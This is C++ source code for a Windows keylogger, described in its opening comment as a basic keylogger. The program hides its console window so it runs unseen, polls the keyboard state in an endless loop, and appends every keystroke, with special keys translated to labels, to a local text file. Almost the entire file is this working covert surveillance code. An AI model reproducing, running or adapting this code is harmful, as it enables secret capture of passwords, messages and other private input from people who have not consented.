/* A Basic Keylogger Using C++ WIN32 API , stores all characters typed during the runtime of this 
program in a text file */

#include<bits/stdc++.h>
#include<iostream>
#include<fstream>
#include<windows.h>

using namespace std;

#define LOG_FILE "keylogger.txt"

//Function to open file , write the keys pressed into file , save it and then close it

void savedata (string data) {
    fstream logfile;
    logfile.open(LOG_FILE, ios::app);
    logfile<<data;
    logfile.close();
}

//Transaltion from Virtual Key Code to String
//Every Key in keyboard has ASCII values as well as Virtual Key Codes(VKC), we use VKC 
// and determine if key is special or not and then transalte it for our convenience

string specialkeytranslator (int key) {
    string result;
    switch (key) {

        //Normal Special Keys
        case VK_SPACE  : {result = " "; break;} //Space
        case VK_RETURN : {result = "\n"; break;} //Enter
        case VK_BACK : {result = "\b"; break;} //Backspace
        case VK_CAPITAL : {result = ""; break;} //Capitals
        case VK_SHIFT : {result = "[SHIFT]"; break;} //Shift
        case VK_TAB : {result = "[TAB]"; break;} //Tab
        case VK_CONTROL : {result = "[CTRL]"; break; } //Control
        case VK_MENU : {result = "[ALT]"; break; } //Alt
        case VK_ESCAPE : {result = "[ESC]"; break; } //Escape
        case VK_DELETE : {result = "[DELETE]"; break;} //Delete
        
        //Double Key Combination Keys (OEM Keys)
        case VK_OEM_1 : {result = " :; "; break;} // : or ;
        case VK_OEM_PLUS : {result = "+"; break;} // +
        case VK_OEM_COMMA : {result = ","; break;} // ,
        case VK_OEM_MINUS : {result = "-"; break;} // -
        case VK_OEM_PERIOD : {result = "."; break;} // .
        case VK_OEM_2 : {result = " /? "; break;} // / or ?
        case VK_OEM_3 : {result = " `~ "; break;} // ` or ~
        case VK_OEM_4 : {result = " [{ "; break;}  // { or [
        case VK_OEM_5 : {result = " \\| "; break;} // \ or |
        case VK_OEM_6 : {result = " ]} "; break;} // ] or }
        case VK_OEM_7 : {result = " \" "; break;} // ' or "
        case VK_OEM_8 : {result = "hi1"; break;} // 
        case VK_UP : {result = "[UP]"; break;} // arrow up
        case VK_DOWN : {result = "[DOWN]"; break;} // arrow down
        case VK_LEFT : {result = "[LEFT]"; break;} // arrow left
        case VK_RIGHT : {result = "[RIGHT]"; break;} //arrow right

        default : break;

    } 
    return result;
}

int main () {

    int special_keys [] = {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB,
                           VK_CONTROL, VK_MENU, VK_ESCAPE, VK_DELETE,VK_OEM_COMMA, VK_OEM_PLUS,
                           VK_OEM_MINUS,VK_OEM_PERIOD, VK_OEM_1,VK_OEM_2,VK_OEM_3,VK_OEM_4,VK_OEM_5,
                           VK_OEM_6,VK_OEM_7,VK_OEM_8,VK_UP,VK_DOWN,VK_LEFT,VK_RIGHT};
    string specialkeychar;
    bool isspecial;
   //Hide Terminal Window ON TASKBAR LOL!
   
   HWND hwnd = GetConsoleWindow();
   ShowWindow(hwnd, SW_HIDE);

   //An Infinite Loop for Continuous , instantaneous checking for any Key pressed
   //Loop through all key integer values to check if any of them are pressed or not (8-190)

   while (1) {
        for(int key = 8; key <= 226; key++) {
            //Check for Key Press continuously
            if (GetAsyncKeyState(key) == -32767) 
            {   
                isspecial = find(begin(special_keys), end(special_keys),key) != end(special_keys);

                //isspecial Set to true if key value is one of special key values
                //Hence, we need to translate special key
                if (isspecial) 
                { 
                    specialkeychar = specialkeytranslator(key);
                    cout<<specialkeychar<<endl; 
                //After Translation , Saving the string to our log file using our defined function
                    savedata(specialkeychar);
                }
                else 
                {
                    //For non-special keys, check if capital or not
                    if(GetKeyState(VK_CAPITAL))
                    {   
                        //if CAPITAL letters
                        savedata(string(1,(char)key));
                    }
                    else 
                    {
                        //if SMALL letters
                        savedata(string(1,tolower(key)));
                    }
                }
        }
   }
}
    return 0;
}